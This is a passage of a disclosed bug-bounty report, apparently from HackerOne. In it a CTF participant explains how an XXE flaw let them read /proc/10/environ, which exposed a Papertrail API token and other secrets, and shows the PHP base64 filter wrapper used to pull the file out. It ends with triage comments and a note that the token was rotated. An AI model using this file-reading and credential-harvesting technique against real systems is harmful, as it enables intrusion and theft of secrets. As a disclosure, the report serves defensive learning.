usage of PHP filters to exfil the data from the server. In many cases the XXE exfil fails due to encoding or character related problems. During the CTF I noticed many of the participants saying they were able to perform XXE, but thought it was &quot;blind&quot; because they were unable to exfil the data.</p>\n\n<p>With usage of PHP filter, you don&#39;t have to think about the encodings or characters involved in the file, as they get encoded to base64 which on the other hand can be regarded as HTTP safe.</p>\n<pre class=\"highlight plaintext\"><code>php://filter/convert.base64-encode/resource=file:///%s\n</code></pre>\n<p>Check the payload in the initial report or in the script!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3409911, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-01T08:58:20.134Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-01T08:58:20.134Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hello @osintopsec!\n\nThank you so much for this report and the script.\nWe added the papertrail logs after a while and we didn't think about this!\n\nBy the time you submitted this report we already had the winners selected for the H1-5411 event. I'm going to discuss this report with the staff. I'm not sure if the CTF reports are going to be disclosed.\n\nWe'll reach out to you soon!", 
+            "markdown_message": "<p>Hello <a href=\"/osintopsec\">@osintopsec</a>!</p>\n\n<p>Thank you so much for this report and the script.<br>\nWe added the papertrail logs after a while and we didn&#39;t think about this!</p>\n\n<p>By the time you submitted this report we already had the winners selected for the H1-5411 event. I&#39;m going to discuss this report with the staff. I&#39;m not sure if the CTF reports are going to be disclosed.</p>\n\n<p>We&#39;ll reach out to you soon!</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3411788, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-01T09:23:09.687Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-01T09:23:09.687Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hi @0xacb, \n\nThanks for getting back to me! Was fun to find an actual vulnerability even that i got to start the ctf a bit late. Keep me posted and keep up the good fight! ", 
+            "markdown_message": "<p>Hi <a href=\"/0xacb\">@0xacb</a>, </p>\n\n<p>Thanks for getting back to me! Was fun to find an actual vulnerability even that i got to start the ctf a bit late. Keep me posted and keep up the good fight! </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3412144, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-02T18:28:21.718Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-02T18:28:21.718Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hola @0xacb!\n\nCan confirm, the papertrail key has been rotated.\n\n```\ncurl -i -H \"X-Papertrail-Token: ii6r9Z-RETACTED\" https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 401 Unauthorized\nDate: Tue, 02 Oct 2018 18:26:24 GMT\nStrict-Transport-Security: max-age=31536000\nCache-Control: no-cache\nWWW-Authenticate: Basic realm=\"Papertrail API\"\nX-Runtime: 3\nContent-Length: 27\nStatus: 401 Unauthorized\nVary: Accept-Encoding\nContent-Type: text/html; charset=utf-8\n\nHTTP Basic: Access denied.\n```", 
+            "markdown_message": "<p>Hola <a href=\"/0xacb\">@0xacb</a>!</p>\n\n<p>Can confirm, the papertrail key has been rotated.</p>\n<pre class=\"highlight plaintext\"><code>curl -i -H &quot;X-Papertrail-Token: ii6r9Z-RETACTED&quot; https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 401 Unauthorized\nDate: Tue, 02 Oct 2018 18:26:24 GMT\nStrict-Transport-Security: max-age=31536000\nCache-Control: no-cache\nWWW-Authenticate: Basic realm=&quot;Papertrail API&quot;\nX-Runtime: 3\nContent-Length: 27\nStatus: 401 Unauthorized\nVary: Accept-Encoding\nContent-Type: text/html; charset=utf-8\n\nHTTP Basic: Access denied.\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 3422287, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "osintopsec", 
+                "url": "/osintopsec"
+            }, 
+            "created_at": "2018-10-22T15:59:44.372Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T15:59:44.372Z", 
+            "actor": {
+                "username": "nahamsec", 
+                "url": "/nahamsec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 3514735, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T17:55:02.791Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T17:55:02.791Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Did I lose my chance of getting a H1 hoodie?", 
+            "markdown_message": "<p>Did I lose my chance of getting a H1 hoodie?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3515355, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T17:55:15.870Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T17:55:15.870Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "first_to_agree": true, 
+            "message": "Anyway! I feel like there's something in this report that's beneficial to the community (ie. never stop looking!), can we disclose this also like the others?", 
+            "markdown_message": "<p>Anyway! I feel like there&#39;s something in this report that&#39;s beneficial to the community (ie. never stop looking!), can we disclose this also like the others?</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3515357, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T20:38:44.655Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T20:38:44.655Z", 
+            "actor": {
+                "username": "nahamsec", 
+                "url": "/nahamsec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hey @osintopsec - Thank you for your submission and we'd be more than happy to disclose this, but in the future please note that hacking the CTF instance or leaderboards are out of scope of the CTF. We are going to make sure to highlight this in our \"Rules of engagement\" moving forward. \n\nWe appreciate you reporting this to us and we'd love to send you some h1 swag since we weren't able to invite you to the live hacking event. Thanks again and happy hacking! ", 
+            "markdown_message": "<p>Hey <a href=\"/osintopsec\">@osintopsec</a> - Thank you for your submission and we&#39;d be more than happy to disclose this, but in the future please note that hacking the CTF instance or leaderboards are out of scope of the CTF. We are going to make sure to highlight this in our &quot;Rules of engagement&quot; moving forward. </p>\n\n<p>We appreciate you reporting this to us and we&#39;d love to send you some h1 swag since we weren&#39;t able to invite you to the live hacking event. Thanks again and happy hacking! </p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3516282, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T20:38:44.745Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T20:38:44.745Z", 
+            "actor": {
+                "username": "nahamsec", 
+                "url": "/nahamsec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3516283, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-23T06:18:56.642Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-23T06:26:52.953Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hi @nahamsec! That's a sure thing, but maybe there can be some safe harbor if a event like this ever happens again - like in this case which was more of an accident giving out those red flags that put the brain on the thread mill. The swag is welcomed with great appreciation.\n\n@0xacb and @nahamsec, there is still one question which I would be very interested to have an answer:\n```\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\n``` \nDid you guys put up the header and did you have any suspicion that someone would actually find it? ", 
+            "markdown_message": "<p>Hi <a href=\"/nahamsec\">@nahamsec</a>! That&#39;s a sure thing, but maybe there can be some safe harbor if a event like this ever happens again - like in this case which was more of an accident giving out those red flags that put the brain on the thread mill. The swag is welcomed with great appreciation.</p>\n\n<p><a href=\"/0xacb\">@0xacb</a> and <a href=\"/nahamsec\">@nahamsec</a>, there is still one question which I would be very interested to have an answer:</p>\n<pre class=\"highlight plaintext\"><code>X-Shibboleet: if you see this, we&#39;d like to get you a thank you espresso\n</code></pre>\n<p>Did you guys put up the header and did you have any suspicion that someone would actually find it? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3517774, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-23T17:19:57.356Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-23T17:19:57.356Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hey @osintopsec,\n\nNo, this seems a random header added by papertrailapp.com :)\n\nBest regards,\nAndr\u00e9", 
+            "markdown_message": "<p>Hey <a href=\"/osintopsec\">@osintopsec</a>,</p>\n\n<p>No, this seems a random header added by papertrailapp.com :)</p>\n\n<p>Best regards,<br>\nAndr\u00e9</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3521360, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/370/888/21669665fa46012adf25845b18a41a6dfe96244c/coffee.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221519Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e03535438789ab99e554fa731e1816b077c5e31ae628a4f3b30bcb0e6102f851", 
+                    "type": "image/jpeg", 
+                    "id": 370888, 
+                    "filename": "coffee.jpg"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-11-05T12:54:44.313Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-05T12:54:44.313Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hi @0xacb\n\nThis might be the final epilogue to this story. Solarwinds (the company behind Papertrail) was indeed interested in hearing about the header and where I found it, and I also found out that the guys there are extremely hacker-friendly. Mail got me coffee today as promised on the header!\n{F370888}\n\nSo thank you @0xacb and @nahamsec for the great experience! I'm looking forward to the next challenge.\n\nAlso ping @nahamsec for h1-swag :)\n", 
+            "markdown_message": "<p>Hi <a href=\"/0xacb\">@0xacb</a></p>\n\n<p>This might be the final epilogue to this story. Solarwinds (the company behind Papertrail) was indeed interested in hearing about the header and where I found it, and I also found out that the guys there are extremely hacker-friendly. Mail got me coffee today as promised on the header!<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"coffee.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/370/888/21669665fa46012adf25845b18a41a6dfe96244c/coffee.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221519Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e03535438789ab99e554fa731e1816b077c5e31ae628a4f3b30bcb0e6102f851\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/370/888/21669665fa46012adf25845b18a41a6dfe96244c/coffee.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221519Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e03535438789ab99e554fa731e1816b077c5e31ae628a4f3b30bcb0e6102f851\" class=\"markdown-inline-image\"></a></p>\n\n<p>So thank you <a href=\"/0xacb\">@0xacb</a> and <a href=\"/nahamsec\">@nahamsec</a> for the great experience! I&#39;m looking forward to the next challenge.</p>\n\n<p>Also ping <a href=\"/nahamsec\">@nahamsec</a> for h1-swag :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3586762, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "osintopsec", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/osintopsec", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 26, 
+        "name": "Improper Access Control - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -1311602.973765606, 
+    "disclosed_at": "2018-10-22T20:38:44.720Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/416123", 
+    "created_at": "2018-09-29T13:19:28.591Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi there dear CTF staff!</p>\n\n<p>First of all a huge thank you for the great challenge you put up! I&#39;ve found it super exciting and the learning curve has been steep.</p>\n\n<p>For this case, I was first wondering if this is a part of the actual CTF, but after some inspecting, it surely doesn&#39;t seem so! I did even reach out to you via Twitter for initial confirmation.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"twitter.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/815/384eb4d5d8b6fa744f8063b35f2cb3e5f3990263/twitter.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b896c7df76295863922164e76bbd066beccd12308458bd2444d6235d53fba0a7\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/815/384eb4d5d8b6fa744f8063b35f2cb3e5f3990263/twitter.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b896c7df76295863922164e76bbd066beccd12308458bd2444d6235d53fba0a7\" class=\"markdown-inline-image\"></a></p>\n\n<h1 id=\"the-case\">The Case</h1>\n\n<p>During some serious Meme generation and attempting on the CTF, I managed to reach a situation where I was able to read files from the local filesystem via XXE. After some poking around on the filesystem I was able to determin the Apache2 process id by chaining file discoveries:<br>\n-&gt; /etc/apache2/apache2.conf<br>\n-&gt; /etc/apache2/envvars<br>\n-&gt; /var/run/apache2$SUFFIX/apache2.pid, (Notes: $SUFFIX = &quot;&quot; and the file contains &quot;10&quot;)<br>\n-&gt; /proc/10/environ</p>\n\n<p>Which contains the environment data for Apache2 as (redacted for your good!):</p>\n<pre class=\"highlight plaintext\"><code>HEROKU_EXEC_URL=https://exec-manager.heroku.com/ea0bc596-REDACTED\nPHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi\nAPACHE_CONFDIR=/etc/apache2\nPHP_INI_DIR=/usr/local/etc/php\nSHLVL=1\nPHP_EXTRA_BUILD_DEPS=apache2-dev\nPORT=58345\nPHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie\nAPACHE_RUN_DIR=/var/run/apache2\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2\nPHP_MD5=\nPHP_VERSION=7.2.10\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nGPG_KEYS=1729F83938-REDACTED B1B44D8F021E-REDACTED\nPHP_ASC_URL=https://secure.php.net/get/php-7.2.10.tar.xz.asc/from/this/mirror\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2\n_=/usr/sbin/apache2ctl\nPHP_URL=https://secure.php.net/get/php-7.2.10.tar.xz/from/this/mirror\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPAPERTRAIL_API_TOKEN=ii6r9Ze-REDACTED\nAPACHE_LOCK_DIR=/var/lock/apache2\nLANG=C\nAPACHE_RUN_USER=www-data\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nPHPIZE_DEPS=autoconf        dpkg-dev        file        g++         gcc         libc-dev        make        pkg-config      re2c\nPWD=/app\nPHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0\nAPACHE_ENVVARS=/etc/apache2/envvars\nDYNO=web.1\n</code></pre>\n<p>What caught my eye were Papertrail API-token and GPG-keypair. Also Heroku Exec url is present.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/822/cd7ea1c07410de16832a84ec7c15c01729cabffa/1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=771470716ca7af257ecd507914fa094a3e372d2951014a8818cee9ce7d60fbab\" data-attachment-type=\"image/jpeg\"><img 